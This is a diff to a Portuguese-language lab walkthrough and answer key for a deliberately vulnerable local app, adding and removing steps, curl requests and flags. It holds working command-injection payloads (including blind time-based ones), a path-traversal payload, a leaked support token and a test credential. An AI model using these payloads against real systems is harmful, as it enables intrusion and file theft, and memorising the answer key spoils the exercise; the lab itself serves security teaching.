@@ -21,6 +21,8 @@ Fluxo tecnico:
 9. O backup aponta para `user-candidates.txt` e `password-candidates.txt`.
 10. `GET /backup/user-candidates.txt`.
 11. `GET /backup/password-candidates.txt`.
+12. A nota de deployment tambem menciona `access-review.txt`.
+13. `GET /old/access-review.txt`.
 
 Payload de erro:
 
@@ -60,6 +62,12 @@ Credencial final:
 analyst:analyst123
 ```
 
+Flag pre-auth:
+
+```text
+FLAG{pre_auth_debug_disclosure_lab3}
+```
+
 Causa raiz:
 
 - debug error em producao;
@@ -90,10 +98,9 @@ target: 127.0.0.1; ls -la /app
 target: 127.0.0.1; find /app -maxdepth 3 -type f 2>/dev/null
 target: 127.0.0.1; cat /app/flags/flag1.txt
 target: 127.0.0.1; sleep 5; #
+target: 127.0.0.1; cp /app/flags/flag_time.txt /app/public/reports/tcp-proof.txt; sleep 5; #
 target: localhost && cat /app/flags/flag2.txt
-file=../flags/flag3.txt
 file=../flags/flag4.txt
-archiveName: backup.tar.gz; cat /app/flags/flag5.txt
 archiveName: backup.tar.gz; cat /app/flags/root.txt
 ```
 
@@ -265,6 +272,17 @@ Body time-based:
 }
 ```
 
+Body com efeito colateral observavel:
+
+```json
+{
+  "assetId": "gw-01",
+  "checkType": "tcp",
+  "target": "127.0.0.1; cp /app/flags/flag_time.txt /app/public/reports/tcp-proof.txt; sleep 5; #",
+  "port": "80"
+}
+```
+
 Payload:
 
 ```text
@@ -272,6 +290,18 @@ target = 127.0.0.1; sleep 5; #
 ```
 
 A resposta TCP nao retorna stdout/stderr. Ela retorna metadados, incluindo `durationMs`. Quando o payload com `sleep 5` faz a resposta demorar aproximadamente 5 segundos a mais que a requisicao controle, isso confirma blind command injection por canal de tempo.
+
+Para obter a flag por efeito colateral seguro, use o payload com `cp` acima e depois acesse:
+
+```text
+GET /reports/tcp-proof.txt
+```
+
+Flag:
+
+```text
+FLAG{blind_time_based_command_injection_lab3}
+```
 
 Exemplo curl opcional:
 
@@ -402,7 +432,7 @@ header expected: X-Support-Token
 support token prefix: netaudit
 support token middle: debug
 support token suffix: 2026
-backup route only exposed by internal healthcheck
+diagnostics and backup routes only exposed by internal healthcheck
 archived incident evidence moved outside data directory
 legacy resolver endpoint kept for support troubleshooting
 ```
@@ -440,27 +470,15 @@ O campo `Log file` dispara:
 GET /api/support/log?file=app.log
 ```
 
-O endpoint vulneravel usa `path.join("/app/data", file)` sem validar o caminho final. Como o `app.log` informa que a evidencia foi movida para fora do data directory, usar `../flags/flag3.txt` produz `/app/data/../flags/flag3.txt`, que resolve para `/app/flags/flag3.txt`.
+O endpoint vulneravel usa `path.join("/app/data", file)` sem validar o caminho final. Como o `app.log` informa que a evidencia foi movida para fora do data directory, usar `../flags/flag4.txt` produz `/app/data/../flags/flag4.txt`, que resolve para `/app/flags/flag4.txt`.
 
-Payloads:
+Payload:
 
 ```text
-file=../flags/flag3.txt
 file=../flags/flag4.txt
 ```
 
-Flag3:
-
-```bash
-curl -s -b cookies.txt \
-  "http://127.0.0.1:8090/api/support/log?file=../flags/flag3.txt"
-```
-
-```text
-FLAG{logs_leaking_sensitive_info_lab3}
-```
-
-Flag4:
+Flag:
 
 ```bash
 curl -s -b cookies.txt \
@@ -470,8 +488,6 @@ curl -s -b cookies.txt \
 ```text
 FLAG{path_traversal_log_viewer_lab3}
 ```
-
-`flag3` e `flag4` sao duas evidencias diferentes obtidas pela mesma falha de path traversal.
 
 Mitigacao:
 
@@ -509,14 +525,37 @@ Resposta revela:
   "status": "healthy",
   "service": "NetAudit",
   "environment": "production",
+  "diagnosticEndpoint": "/api/internal/diagnostics",
   "backupEndpoint": "/api/internal/backup",
   "method": "POST",
-  "requiredParameter": "archiveName",
-  "diagnosticFile": "/app/flags/flag5.txt"
+  "requiredParameter": "archiveName"
 }
 ```
 
-Nao retorna flag diretamente. O ponto importante e que o JSON revela `backupEndpoint`, `method: "POST"` e `requiredParameter: "archiveName"`.
+Nao retorna flag diretamente. O ponto importante e que o JSON revela `diagnosticEndpoint`, `backupEndpoint`, `method: "POST"` e `requiredParameter: "archiveName"`.
+
+Rota de diagnostics:
+
+```text
+GET /api/internal/diagnostics
+```
+
+Curl:
+
+```bash
+curl -s \
+  -H "X-Support-Token: netaudit-debug-2026" \
+  http://127.0.0.1:8090/api/internal/diagnostics
+```
+
+Resposta:
+
+```json
+{
+  "status": "diagnostics_ready",
+  "flag": "FLAG{internal_diagnostics_token_abuse_lab3}"
+}
+```
 
 Mitigacao:
 
@@ -551,15 +590,7 @@ Body normal:
 
 No Burp Repeater, crie a requisicao manualmente a partir dos metadados do health interno e mantenha o header de suporte.
 
-Flag5:
-
-```json
-{
-  "archiveName": "backup.tar.gz; cat /app/flags/flag5.txt"
-}
-```
-
-Root:
+Flag final:
 
 ```json
 {
@@ -576,10 +607,9 @@ curl -s -X POST http://127.0.0.1:8090/api/internal/backup \
   -d '{"archiveName":"backup.tar.gz; cat /app/flags/root.txt"}'
 ```
 
-Flags:
+Flag:
 
 ```text
-FLAG{admin_route_exposed_by_debug_token}
 FLAG{admin_backup_command_injection_lab3}
 ```
 
@@ -600,10 +630,11 @@ Mitigacao:
 ## Lista de flags
 
 ```text
+FLAG{pre_auth_debug_disclosure_lab3}
 FLAG{command_injection_ping_lab3}
+FLAG{blind_time_based_command_injection_lab3}
 FLAG{weak_filter_bypass_lab3}
-FLAG{logs_leaking_sensitive_info_lab3}
 FLAG{path_traversal_log_viewer_lab3}
-FLAG{admin_route_exposed_by_debug_token}
+FLAG{internal_diagnostics_token_abuse_lab3}
 FLAG{admin_backup_command_injection_lab3}
 ```
